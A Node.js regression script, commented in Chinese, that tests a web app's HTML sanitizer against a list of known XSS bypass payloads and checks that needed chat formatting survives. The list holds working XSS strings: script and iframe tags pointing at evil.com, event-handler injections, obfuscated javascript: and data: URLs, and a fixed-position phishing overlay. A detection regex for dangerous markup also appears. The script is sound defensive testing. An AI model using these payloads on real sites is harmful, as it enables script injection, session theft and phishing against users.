/**
 * XSS 消毒回归检查（不依赖测试框架，`node scripts/xss-check.mjs` 直接跑）。
 *
 * ## 它验什么
 *
 * 把 `src/views/utils/sanitize.ts` **真实编译出来**（esbuild 打包，不是复制配置），
 * 在 jsdom 里喂一批已知的绕过 payload，断言：
 *   1. 危险标签/属性/协议一个都不剩；
 *   2. 我们确实需要的排版标签（含 markdown 渲染器产出的内联 style）还在。
 *
 * 第 2 条同样重要：只验"挡得住"很容易写成"把一切都删光"，
 * 那种消毒器安全但把功能也杀了。
 *
 * ## 为什么不用 vitest
 *
 * 项目前端没有测试框架，为这一件事引入一整套 runner 不划算。
 * 这个脚本能在 CI 里以 `node scripts/xss-check.mjs` 跑，退出码非 0 即失败。
 */
import { JSDOM } from 'jsdom';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);

const dom = new JSDOM('<!doctype html><html><body></body></html>', { url: 'http://localhost' });
// DOMPurify 的 Node 入口会读取全局 window；必须在 import 之前挂好
globalThis.window = dom.window;
globalThis.document = dom.window.document;
globalThis.Node = dom.window.Node;
globalThis.HTMLElement = dom.window.HTMLElement;

const outDir = mkdtempSync(join(tmpdir(), 'xss-check-'));
const bundle = join(outDir, 'sanitize.mjs');

// 走 esbuild 的 **JS API**，不用它的命令行入口。
// 原因：`node_modules/esbuild/bin/esbuild` 在 Windows 上是个 JS shim，用 `node`
// 执行没问题；但在 Linux 上它是**原生 ELF 二进制**，`node <那个文件>` 直接
// `SyntaxError: Invalid or unexpected token`（2026-10-28 CI 就栽在这，本地永远复现不出）。
// JS API 只要求 Node 环境，不碰二进制路径、不依赖 shell，两个平台行为一致。
const esbuild = require('esbuild');

esbuild.buildSync({
  entryPoints: ['src/views/utils/sanitize.ts'],
  bundle: true,
  format: 'esm',
  platform: 'browser',
  // 连 dompurify 一起打进来：bundle 落在临时目录，若保留 external，
  // Node 在该目录下解析不到 node_modules。打包后体积约 30KB，无所谓。
  outfile: bundle,
});

const { sanitizeChatHtml, sanitizeSnapshotHtml } = await import(`file://${bundle}`);

/** 已知能绕过「正则黑名单」的 payload —— 原实现全部漏过。 */
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.com/x.js></SCRIPT>',
  '<svg/onload=alert(1)>',
  '<img src=x onerror=alert(1)>',
  '<a href="java&#9;script:alert(1)">click</a>',
  '<a href="javascript:alert(1)">click</a>',
  '<a href="JaVaScRiPt:alert(1)">click</a>',
  '<iframe src="//evil.com"></iframe>',
  '<object data="//evil.com"></object>',
  '<embed src="//evil.com">',
  '<meta http-equiv="refresh" content="0;url=//evil.com">',
  '<form action="//evil.com"><input name="x"></form>',
  '<div style="position:fixed;inset:0;z-index:99999">overlay</div>',
  '<img src="x" onload="alert(1)">',
  '<body onload=alert(1)>',
  '<math><mtext><script>alert(1)</script></mtext></math>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">d</a>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
];

/** 这些必须活下来，否则功能被消毒器误杀。 */
const KEEP_CHAT = [
  '<h1 style="color:#333">标题</h1>',
  '<p style="margin:10px 0">段落 <strong style="color:red">粗体</strong></p>',
  '<pre style="background:#111"><code class="language-python">print(1)</code></pre>',
  '<table style="width:100%"><thead><tr><th>a</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>',
  '<ul><li>x</li></ul><blockquote style="border-left:4px solid #ccc">引用</blockquote>',
  '<a href="https://example.com">外链</a>',
];

let failed = 0;

function check(name, condition, detail) {
  if (condition) {
    console.log(`  \x1b[32m✓\x1b[0m ${name}`);
  } else {
    failed += 1;
    console.log(`  \x1b[31m✗\x1b[0m ${name}${detail ? `\n      ${detail}` : ''}`);
  }
}

const DANGEROUS = /<\s*(script|iframe|object|embed|form|input|meta|link|base|svg|math|template|animate)\b|on[a-z]+\s*=|javascript:|data:text\/html/i;

console.log('\n[1] 危险 payload 必须被清除（sanitizeChatHtml）');
for (const payload of XSS_PAYLOADS) {
  const out = sanitizeChatHtml(payload);
  check(
    payload.length > 44 ? `${payload.slice(0, 44)}…` : payload,
    !DANGEROUS.test(out),
    `输出残留：${out}`,
  );
}

console.log('\n[2] 危险 payload 必须被清除（sanitizeSnapshotHtml）');
for (const payload of XSS_PAYLOADS) {
  const out = sanitizeSnapshotHtml(payload);
  check(
    payload.length > 44 ? `${payload.slice(0, 44)}…` : payload,
    !DANGEROUS.test(out),
    `输出残留：${out}`,
  );
}

console.log('\n[3] 第三方快照不得保留 style（防全屏钓鱼遮罩）');
{
  const out = sanitizeSnapshotHtml('<div style="position:fixed;inset:0">x</div>');
  check('style 属性被剥离', !/style\s*=/i.test(out), `输出：${out}`);
}

console.log('\n[4] AI 回答的排版不能被误杀（含内联 style）');
for (const html of KEEP_CHAT) {
  const out = sanitizeChatHtml(html);
  const tag = html.match(/<([a-z0-9]+)/i)?.[1] ?? '?';
  check(`<${tag}> 保留`, out.trim().length > 0 && new RegExp(`<${tag}[\\s>]`, 'i').test(out), `输出：${out}`);
}
{
  const out = sanitizeChatHtml('<h1 style="color:#333">标题</h1>');
  check('内联 style 仍保留（否则 AI 回答会掉格式）', /style\s*=/.test(out), `输出：${out}`);
}

console.log('\n[5] 外链加固');
{
  const out = sanitizeChatHtml('<a href="https://example.com">x</a>');
  check('补 rel="noopener noreferrer"', /rel="noopener noreferrer"/.test(out), `输出：${out}`);
  check('补 target="_blank"', /target="_blank"/.test(out), `输出：${out}`);
}

rmSync(outDir, { recursive: true, force: true });

console.log(failed === 0 ? '\n\x1b[32m全部通过\x1b[0m\n' : `\n\x1b[31m${failed} 项失败\x1b[0m\n`);
process.exit(failed === 0 ? 0 : 1);
